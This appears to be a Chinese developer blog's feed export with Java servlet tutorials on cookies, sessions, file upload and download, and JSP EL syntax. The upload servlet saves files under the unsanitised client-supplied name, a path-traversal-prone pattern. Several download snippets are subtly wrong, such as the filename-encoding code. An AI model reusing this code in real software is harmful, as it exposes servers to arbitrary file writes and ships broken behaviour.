0；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie[] cookies=req.getCookies();</span><br><span class="line">Cookie cookie = WebUtils.findCookie(<span class="string">&quot;Yuuki&quot;</span>, cookies);</span><br><span class="line">cookie.setValue(<span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">resp.addCookie(cookie);</span><br></pre></td></tr></table></figure><h3 id="Domain-和-Path"><a href="#Domain-和-Path" class="headerlink" title="Domain 和 Path"></a>Domain 和 Path</h3><p>这个属性是定义在怎样的域名和路径下，才会发送 Cookie 给服务器。</p><p>对于一个访问地址： <code>http://xorex.space:8080/BookStore/manager</code> 设定 Cookie 只在访问这里的时候发送：</p><p>Path 设置为：/BookStore/manager</p><p>Domain 设置为：xorex.space</p><p>需要注意的是，这里定义的限制 Cookie 发送指的是只有访问地址为 <code>Domain+Path</code> 的子地址才会发送 Cookie，比如 Path 的子地址：<code>/BookStore/mananger/xorex/index.jsp</code> 和 Domain 的子地址：<code>bookstore.xorex.space</code> 都符合发送 Cookie 的要求，而且这里 Cookie 的限制是<strong>无视</strong>端口号的。</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><h3 id="Session-概述"><a href="#Session-概述" class="headerlink" title="Session 概述"></a>Session 概述</h3><p>Session 指的是一个会话，会话是指一个终端用户与交互系统进行通讯的过程。在 Web 里面就是从开发访问网页执行一定的操作之后最后关闭网页的过程。</p><p>首先服务器里面有一个 Session 池，里面负责存储和生成 Session 对象，当客户端第一次访问服务器的时候，是肯定不会包含带有 Session ID 值的 Cookie 的。那么服务器会把它当作一个会话的开始，为这个客户生成一个 Session 对象，保存到 Session 池中，然后将这个 Session 对象的 Session ID 写入响应头的 Cookie 中，让浏览器保存下来，作为会话的认证标志。</p><p>从一次之后的所有交互中，客户端都会将 Session ID 的 Cookie 放到请求头中，服务器通过这个 Session ID 从 Session 池中找到客户的 Session 对象来进行操作。Session 实例中同样拥有可以设置属性的域，会伴随这 Session 实例可以随意获取。</p><h3 id="Session-创建和获取"><a href="#Session-创建和获取" class="headerlink" title="Session 创建和获取"></a>Session 创建和获取</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpSession session=req.getSession(); <span class="comment">//会自动决定是生成新的 Session 还是去 Session 池中去取。</span></span><br><span class="line">session.getID() <span class="comment">//获取 Session 的 ID 值。</span></span><br></pre></td></tr></table></figure><h3 id="Session-生命周期控制"><a href="#Session-生命周期控制" class="headerlink" title="Session 生命周期控制"></a>Session 生命周期控制</h3><h4 id="Session-销毁"><a href="#Session-销毁" class="headerlink" title="Session 销毁"></a>Session 销毁</h4><p>Session 的销毁有三种情况：</p><ol><li><p>当 Session 硬是熬过了有效期之后，服务器会自动销毁此 Session。</p></li><li><p>当客户关闭浏览器，使保存了 Session ID 的 Cookie 被销毁，从而无法通过 Session ID 从 Session 池中获取客户的 Session 对象，然后等到默认设置的销毁时间之后，服务器再物理销毁 Session 实例。</p></li><li><p>另外一种则是服务器主动销毁，当使用 Session 的 invalidate() 方法之后，会主动将 Session 中的所有用户信息全部清除，然后此 Session 被禁用，和 request 的绑定也会被解除，但是 Session 对象还活着。当再次用 request 获取 Session 的时候，会从 Session 池中取出一个新的出来。</p></li></ol><h4 id="Session-存活时间设置"><a href="#Session-存活时间设置" class="headerlink" title="Session 存活时间设置"></a>Session 存活时间设置</h4><p>Java 中使用 setMaxInactiveInterval() 方法设置 Session 的最大失效间隔时间，单位秒。</p><p>当设置的时间为正数的时候，则等到经过指定时间后，Session 被销毁。</p><p>当设置时间小于等于零的时候，标志此 Session 永远不会被销毁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.setMaxInactiveInterval(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cookie&quot;&gt;&lt;a href=&quot;#Cookie&quot; class=&quot;headerlink&quot; title=&quot;Cookie&quot;&gt;&lt;/a&gt;Cookie&lt;/h2&gt;&lt;h3 id=&quot;创建-Cookie&quot;&gt;&lt;a href=&quot;#创建-Cookie&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Cookie" scheme="https://xorex.space/tags/Cookie/"/>
    
    <category term="Session" scheme="https://xorex.space/tags/Session/"/>
    
  </entry>
  
  <entry>
    <title>文件上传与下载</title>
    <link href="https://xorex.space/2021/04/03/8fbbcc5007bc/"/>
    <id>https://xorex.space/2021/04/03/8fbbcc5007bc/</id>
    <published>2021-04-03T09:43:24.000Z</published>
    <updated>2021-04-03T11:59:23.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="前端部分"><a href="#前端部分" class="headerlink" title="前端部分"></a>前端部分</h3><p>首先我们写一个文件上传的表单页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;Upload&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;photo&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="comment">&lt;!-- 这里要注意一定要写 name 属性，否则数据不会提交到 Post 里面 --&gt;</span></span><br><span class="line">    用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们使用表单进行传输数据的时候，需要设定属性 <code>enctype=&quot;multipart/form-data&quot;</code> 这是因为对于文件来说，不能像 <code>XXX=XXX&amp;XXX=XXX</code> 这样的 Post 方式传送信息，所以需要使用 multipart 多块传送，将每一组信息都放到一个数据块里面提交。</p><p>这个表单有着血泪史，一定要记得在提交数据的时候一定要些 name 属性，不然组不成 <code>name=value</code> 的格式，就没有办法用 Post 传输数据。然后点击这个表单上传文件并提交之后，我们来看看发出来的 HTTP 请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://localhost:8080/BookStore/Upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------16694935940386624681704157384</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36544</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8080</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/BookStore/test.jsp</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=36C32D4D34BDD9D1138C898DA0C86440; Idea-b21bbe90=38338ff0-a6c6-49f8-b92a-980001c9c1a6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------16694935940386624681704157384</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;.......jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">.PNG</span><br><span class="line">.</span><br><span class="line">....IHDR.......m......E.... .IDATx^.....E..;&quot;....@...C.....</span><br><span class="line">....h,...</span><br><span class="line">.&amp;.&quot;&quot;.]Y@...Q.(.`...rD...a.v.%x....,.%..d.r.D.C..=.._;....y.&#123;f...T................./.d. ...@...... ...@...&amp;!.&#123;=.....@...... ...@ #.8.</span><br><span class="line">-----------------------------16694935940386624681704157384</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">Xorex</span><br><span class="line">-----------------------------16694935940386624681704157384</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">-----------------------------16694935940386624681704157384--</span><br></pre></td></tr></table></figure><p>然后我们来分析一波，下面这个头表示用表单设置出来的，不同的是多了一个 boundary 属性，是浏览器自己生成的随机数分割线，用来分隔 POST 传送的不同的数据块的。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------16694935940386624681704157384</span><br></pre></td></tr></table></figure><p>然后，这个是图片数据块的开头，标识数据名 <code>name=&quot;photo&quot;</code> 和文件名 <code>filename=&quot;.......jpg&quot;</code> （这里因为编码原因无法显示），然后下面的 <code>Content-Type: image/jpeg</code> 作为请求头组成之一标识这个数据块的数据类型为图片，且是 jpeg 格式。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------16694935940386624681704157384</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;.......jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>设置好了前端的文件上传的数据发送，就要设置好后端的数据接收。</p><h4 id="后端部分"><a href="#后端部分" class="headerlink" title="后端部分"></a>后端部分</h4><p>这里需要导入两个 Maven 依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的处理思路主要是先判断是否是 Multipart 类型的数据，如果是则进行处理。然后用 ServletFileUpload 的实例去解析 request 请求里面的数据块，它会将所有的数据块都解析成一个 FileItem 实例，然后封装成一个 List 之后传出来。我们遍历所有的数据块 FileItem ，然后选取不是来自于 Filed 的普通文字标段字段（也就是文件啦），去把这个文件里面的所有内容写入一个 File 里面即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadService</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ServletFileUpload.isMultipartContent(req)) &#123;</span><br><span class="line">            FileItemFactory fileItemFactory=<span class="keyword">new</span> DiskFileItemFactory(); <span class="comment">// 创建工厂实例</span></span><br><span class="line">            ServletFileUpload servletFileUpload=<span class="keyword">new</span> ServletFileUpload(fileItemFactory); <span class="comment">//传入工厂创建文件上传处理的实例</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                List&lt;FileItem&gt; list = servletFileUpload.parseRequest(req); <span class="comment">//解析请求里面的数据块</span></span><br><span class="line">                <span class="keyword">for</span>(FileItem i:list) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(!i.isFormField()) &#123; <span class="comment">//如果不是文本字段，就一定是文件了</span></span><br><span class="line">                        i.write(<span class="keyword">new</span> File(<span class="string">&quot;E:/&quot;</span>+i.getName())); <span class="comment">//将文件内容原封不动写入 File 中</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">            PrintWriter writer = resp.getWriter();</span><br><span class="line">            writer.println(<span class="string">&quot;&lt;h1&gt;上传失败哦&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;Refresh&quot;</span>, <span class="string">&quot;5; url=/BookStore/test.jsp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><h3 id="Servlet-编写"><a href="#Servlet-编写" class="headerlink" title="Servlet 编写"></a>Servlet 编写</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadService</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String downloadName=<span class="string">&quot;waifu.jpg&quot;</span>; <span class="comment">//设置需要传给客户端的文件名</span></span><br><span class="line">        ServletContext context=getServletContext(); <span class="comment">//获取 ServletContext 实例</span></span><br><span class="line">        String MimeType=context.getMimeType(<span class="string">&quot;/static/img/&quot;</span>+downloadName); <span class="comment">//获取文件的 MIME 值，用于告诉客户端文件类型</span></span><br><span class="line">        resp.setContentType(MimeType); <span class="comment">//将 MIME 添加到响应头</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; fileName=&quot;</span>+downloadName); <span class="comment">//添加响应头，告诉浏览器要下载附件</span></span><br><span class="line">        InputStream inputStream=context.getResourceAsStream(<span class="string">&quot;/static/img/&quot;</span>+downloadName); <span class="comment">//获取文件的流资源</span></span><br><span class="line">        OutputStream outputStream=resp.getOutputStream(); <span class="comment">//获取输出流</span></span><br><span class="line">        IOUtils.copy(inputStream, outputStream); <span class="comment">//将文件流资源拷贝到输出流中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="乱码处理"><a href="#乱码处理" class="headerlink" title="乱码处理"></a>乱码处理</h3><p>因为 HTTP 协议在设计的时候就没有考虑到中文的问题，所以就有可能会出现中文文件名乱码。对于访问的客户端我们可以分为火狐浏览器和非火狐浏览器，对于非火狐浏览器，我们只需要对涉及到中文的地方进行 URL 编码即可，浏览器会自动对 URL 编码进行 URL 解码和 UTF-8 解码获取中文：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadService</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String downloadName=<span class="string">&quot;Waifu.jpg&quot;</span>;</span><br><span class="line">        ServletContext context=getServletContext();</span><br><span class="line">        String MimeType=context.getMimeType(<span class="string">&quot;/static/img/&quot;</span>+downloadName);</span><br><span class="line">        resp.setContentType(MimeType);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; fileName=内存.jpg&quot;</span>+URLEncoder.encode(<span class="string">&quot;内存.jpg&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>)); <span class="comment">//对文件名进行 UTF-8 方式的 URL 编码</span></span><br><span class="line">        InputStream inputStream=context.getResourceAsStream(<span class="string">&quot;/static/img/&quot;</span>+downloadName);</span><br><span class="line">        OutputStream outputStream=resp.getOutputStream();</span><br><span class="line">        IOUtils.copy(inputStream, outputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于火狐浏览器，就需要对文件名进行更特殊的编码了，格式为：<code>=?charset?B?XXXX?=</code>。其中 <code>=?</code> 和 <code>?=</code> 本别标识开始和结束，<code>charset</code> 表示字符的编码方式，<code>B</code> 表示使用 Base64 编码（因为火狐默认用的 Base64 解码后面的东西），<code>XXXX</code> 表示我们用 Base64 加密的 UTF-8 汉字。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadService</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String returnName;</span><br><span class="line">        <span class="keyword">if</span>(req.getHeader(<span class="string">&quot;User-Agent&quot;</span>).contains(<span class="string">&quot;FireFox&quot;</span>)) &#123;</span><br><span class="line">            returnName=<span class="string">&quot;=?utf-8?B?&quot;</span>+String.valueOf(Base64.getEncoder().encode(<span class="string">&quot;内存.jpg&quot;</span>.getBytes(StandardCharsets.UTF_8)))+<span class="string">&quot;?=&quot;</span>;</span><br><span class="line">            System.out.println(returnName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            returnName=URLEncoder.encode(<span class="string">&quot;内存.jpg&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String downloadName=<span class="string">&quot;Waifu.jpg&quot;</span>;</span><br><span class="line">        ServletContext context=getServletContext();</span><br><span class="line">        String MimeType=context.getMimeType(<span class="string">&quot;/static/img/&quot;</span>+downloadName);</span><br><span class="line">        resp.setContentType(MimeType);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; fileName=&quot;</span>+returnName);</span><br><span class="line">        InputStream inputStream=context.getResourceAsStream(<span class="string">&quot;/static/img/&quot;</span>+downloadName);</span><br><span class="line">        OutputStream outputStream=resp.getOutputStream();</span><br><span class="line">        IOUtils.copy(inputStream, outputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件上传&quot;&gt;&lt;a href=&quot;#文件上传&quot; class=&quot;headerlink&quot; title=&quot;文件上传&quot;&gt;&lt;/a&gt;文件上传&lt;/h2&gt;&lt;h3 id=&quot;前端部分&quot;&gt;&lt;a href=&quot;#前端部分&quot; class=&quot;headerlink&quot; title=&quot;前端部分&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Upload" scheme="https://xorex.space/tags/Upload/"/>
    
    <category term="Download" scheme="https://xorex.space/tags/Download/"/>
    
  </entry>
  
  <entry>
    <title>EL &amp; JSTL</title>
    <link href="https://xorex.space/2021/04/02/b84810808110/"/>
    <id>https://xorex.space/2021/04/02/b84810808110/</id>
    <published>2021-04-02T13:12:15.000Z</published>
    <updated>2021-04-03T09:45:39.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EL"><a href="#EL" class="headerlink" title="EL"></a>EL</h2><blockquote><p>EL 全程为 Expression Language 的意思，是在 JSP 中用来代替表达式 <code>&lt;%=Expression%&gt;</code> 的，格式为 <code>$&#123;Expression&#125;</code> 。</p></blockquote><h3 id="获取并输出数据"><a href="#获取并输出数据" class="headerlink" title="获取并输出数据"></a>获取并输出数据</h3><h4 id="获取作用域变量"><a href="#获取作用域变量" class="headerlink" title="获取作用域变量"></a>获取作用域变量</h4><p>EL 可以直接将四大作用域的里面设置的属性作为一个变量直接输出，首先设置：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;Yukinoshita&quot;</span>, <span class="string">&quot;Yukino&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;Yuuki&quot;</span>, <span class="string">&quot;Ausna&quot;</span>);</span><br><span class="line">    application.setAttribute(<span class="string">&quot;Katou&quot;</span>, <span class="string">&quot;Megumi&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>然后利用 EL 进行输出：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Tempest&#125;</span><br><span class="line">$&#123;Yukinoshita&#125;</span><br><span class="line">$&#123;Yuuki&#125;</span><br><span class="line">$&#123;Katou&#125;</span><br></pre></td></tr></table></figure><p>而 EL 获取数据的实现原理是调用 <code>pageContext.findAttribute()</code>，然后分别按照作用域从小到大从  pageContex、request、session 和 application 作用域中搜索属性对应的名字，如果没有搜索到，会返回一个空串 “” 而不是 null（客户又看不懂 null 的意思，直接为空更好）。</p><h4 id="获取-JavaBean-属性"><a href="#获取-JavaBean-属性" class="headerlink" title="获取 JavaBean 属性"></a>获取 JavaBean 属性</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ID;</span><br><span class="line">String Name;</span><br><span class="line"><span class="keyword">short</span>[] scores;</span><br><span class="line">List&lt;String&gt; Address;</span><br><span class="line">Map&lt;String ,String&gt; Love;</span><br></pre></td></tr></table></figure><p>我们设置成功之后，需要将这个 JavaBean 对象放到任何一个作用域中（本地变量无效理由如上 EL 实现原理），访问 JavaBean 中的数据使用 <code>.DataName</code> ，这里的访问等价于 <code>.getDataName()</code>。（其实本质上调用的也是 get 方法），其实理论上无论什么类型的类，只要有合乎规范的 <code>getXXX()</code> 方法，在 EL 中就能通过 <code>.XXX</code> 的方式调用这个方法，获取其返回值。（当然上面是有一个比较特殊的存在就是对于 boolean 类型的获取的方法是 <code>isXXX()</code> 但是同样可以使用 <code>.XXX</code> 来进行访问。）</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;bean.ID&#125; &lt;%-- 这里就等价于输出 bean.getID() --%&gt;</span><br></pre></td></tr></table></figure><h4 id="获取-List-元素"><a href="#获取-List-元素" class="headerlink" title="获取 List 元素"></a>获取 List 元素</h4><p>List 获取到 List 的对象之后，可以使用 List 自带的 <code>get(int index)</code> 或者使用 <code>[index]</code> 下标来获取某个具体 index 的元素。</p><p>下面两者效果相同：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;bean.address[<span class="number">0</span>]&#125; &lt;br&gt;</span><br><span class="line">$&#123;bean.address.get(<span class="number">0</span>)&#125; &lt;br&gt;</span><br></pre></td></tr></table></figure><h4 id="获取-Map-元素"><a href="#获取-Map-元素" class="headerlink" title="获取 Map 元素"></a>获取 Map 元素</h4><p>下面是一个 JavaBean 的 Map 实例获取映射的方法，下面三种方法完全等效。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;bean.love[<span class="string">&quot;Tempest&quot;</span>]&#125; &lt;br&gt;</span><br><span class="line">$&#123;bean.love.Tempest&#125; &lt;br&gt;</span><br><span class="line">$&#123;bean.love.get(<span class="string">&quot;Tempest&quot;</span>)&#125; &lt;br&gt;</span><br></pre></td></tr></table></figure><h3 id="执行运算"><a href="#执行运算" class="headerlink" title="执行运算"></a>执行运算</h3><h4 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h4><p>看图，输出内容是 boolean 的 true 或 false 的字符串：</p><p><img src="https://xorex.space/image/210.jpg"></p><h4 